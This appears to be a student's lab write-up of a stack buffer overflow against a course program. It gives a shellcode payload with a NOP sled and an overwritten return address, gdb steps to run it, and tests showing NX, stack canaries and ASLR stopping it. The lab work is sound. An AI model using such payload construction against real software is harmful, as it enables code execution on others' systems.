# Task 2 

## Final Payload
![[Pasted image 20250603082902.png]]
```
echo -ne "\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80\
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
\x90\x90\
\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\
\x58\xce\xff\xff" > payload.bin
```

- in gdb
```
gdb --args ./build/bin/btu remove 2468 "$(cat payload.bin)"
```
- Set a breakpoint after the overflow
- نوقف التنفيذ بعد ما البافر يتم ملؤه، وقبل ما البرنامج يحاول يعمل `return`، علشان نقدر نفحص الـstack ونتأكد إن كل حاجة اتكتبت صح (shellcode, RET address...).
```
b src/University/University.cpp:199
```
- Verify the stack
![[Pasted image 20250603083414.png]]
- Dump the stack to look for the shellcode
```
x/80xb $esp
```
- continue
```
continue
```
![[Pasted image 20250603083540.png]]

## examining what happens if you enable certain protections against buffer overflows again.
### a) Non-Executable Stack (NX)
#### 🔍 What it does:
- Marks the **stack** region of memory as **non-executable**.
- Any code (like your shellcode) placed on the stack **cannot be executed**.
#### Effect on your attack:
- **Breaks the attack completely**.
- Even if you successfully overwrite the return address to jump to your shellcode, the CPU will throw a **segmentation fault** because execution on the stack is forbidden.
#### Test: Non-Executable Stack (NX)
- Open `Makefile`
- In `CXXFLAGS`, remove
```
-z execstack
```
- then run makefile
```
make clean && make debug
```

![[Pasted image 20250603102240.png]]
- now we try the attack 
```
gdb --args ./build/bin/btu remove 2468 "$(cat payload.bin)"

```
- ![[Pasted image 20250603102711.png]]
- we get **Segmentation fault**,
- because the return address pointing to a place in the stack which is not excutable, so it will cause the system to crash
### b) StackGuard (a.k.a. Stack Canary)
#### 🔍 What it does:
- Adds a **random 4-byte "canary" value** just before the saved return address on the stack.
- When a function returns, it **checks the canary** — if it's changed, the program **aborts immediately**.
#### Effect on your attack:
- **Completely detects and stops the attack**.
- Your overflow will overwrite the canary and the return address.
- The canary check fails → program exits with a "stack smashing detected" error.
- The program terminates before your shellcode can run.
#### Test: StackGuard
- Remove this flag from `CXXFLAGS`
```
-fno-stack-protector
```
- and add this
```
-fstack-protector-all
```
- then run makefile
```
make clean && make debug
```
![[Pasted image 20250603103713.png]]

- and run the attack again
```

```
![[Pasted image 20250603104850.png]]
![[Pasted image 20250603105017.png]]

- program hit **`__stack_chk_fail()`**
- It called `abort()` → which raised `SIGABRT`
- GDB stopped in the syscall that kills the program
- the value of the gaurd will be changed, so the program will call **__stack_chk_fail()** which will return false from the program
- When the compiler inserts a canary into a function, it also adds this check just before the function returns
```
if (__stack_chk_guard != stack_canary_on_stack) {
    __stack_chk_fail();  // ← This is where the program crashes!
}
```
-  `__stack_chk_guard` → the original canary value (stored globally)
- `stack_canary_on_stack` → value in the stack (might have been overwritten)
### c) Address Space Layout Randomization (ASLR)
#### 🔍 What it does:
**ASLR (Address Space Layout Randomization)** randomizes the memory layout of the process **every time it runs**, including:
- Stack
- Heap
- Libraries
- Executable
- Makes it **hard to guess** the correct address to jump to (like the shellcode).
#### Effect on your attack:
- **Usually breaks the attack** unless you disable ASLR or brute-force the address.
- Your return address (e.g., `0xffffce88`) will be wrong most of the time → crash.
- It makes the exploit unreliable but not impossible.
#### Test ASLR
- Make sure ASLR is enabled
```
cat /proc/sys/kernel/randomize_va_space
```
![[Pasted image 20250603110129.png]]
- Check that your binary is not PIE
- This means the program is not position-independent — **only the stack/heap are randomized**, which is exactly what we want to test.

![[Pasted image 20250603110225.png]]
- Run the program multiple times in GDB and print &lhs
```
set disable-randomization off    # Ensure ASLR is active even in GDB
b check_password
run
print &lhs
```
- first time
![[Pasted image 20250603110446.png]]
- second time 
 ![[Pasted image 20250603110521.png]]
 - Third time
![[Pasted image 20250603110625.png]]
- this proves that the **stack address changes each run** → ASLR is working.
- now Run  exploit 
- ![[Pasted image 20250603110804.png]]
- the same exploit that worked before is now at fault due to aslr 